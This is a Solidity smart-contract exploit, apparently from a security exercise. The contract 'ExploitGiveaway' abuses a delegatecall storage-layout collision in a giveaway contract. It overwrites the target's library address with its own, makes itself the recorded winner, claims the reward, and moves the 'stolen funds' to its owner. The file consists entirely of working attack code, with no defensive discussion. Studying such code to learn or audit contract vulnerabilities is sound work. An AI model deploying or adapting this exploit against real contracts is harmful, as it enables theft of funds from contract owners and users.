// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface GiveawayInterface {
    function prepareNewPuzzle(uint _num) external;

    function claimReward() external payable;
}

contract ExploitGiveaway {
    // Make sure the storage layout is the same as giveawayContract
    // This will allow us to correctly update the state variables
    address public lib;
    address public winner;
    uint public someNumber;
    address payable owner;
    GiveawayInterface public giveawayAddress;

    event Log(address indexed sender, string message);
    event ValueReceived(address indexed sender, uint amount);

    constructor(GiveawayInterface _giveawayContract) {
        giveawayAddress = GiveawayInterface(_giveawayContract);
        winner = msg.sender;
        owner = payable(msg.sender);
    }

    function exploit() public payable {
        // override address of lib
        giveawayAddress.prepareNewPuzzle(uint(uint160(address(this))));
        emit Log(msg.sender, "Changed the library used by giveaway smart contract");

        // pass any number as input, the function doSomething() below will be called
        // this contract address will be written as winner
        giveawayAddress.prepareNewPuzzle(1);
        emit Log(msg.sender, "Setup attacker as winner of giveaway");

        // claim reward
        giveawayAddress.claimReward();
        emit Log(msg.sender, "Exploit successfuly executed, reward stolen!");
    }

    // function signature must match giveawayContract.preparePuzzle()
    function preparePuzzle(uint _num) public {
        winner = msg.sender;
    }

    receive() external payable {
        // React to receiving ether
        emit ValueReceived(msg.sender, msg.value);
    }

    function getBalance() public view returns(uint) {
        return address(this).balance;
    }

    function retrieveStolenFunds() public {
        owner.transfer(address(this).balance);
    }
}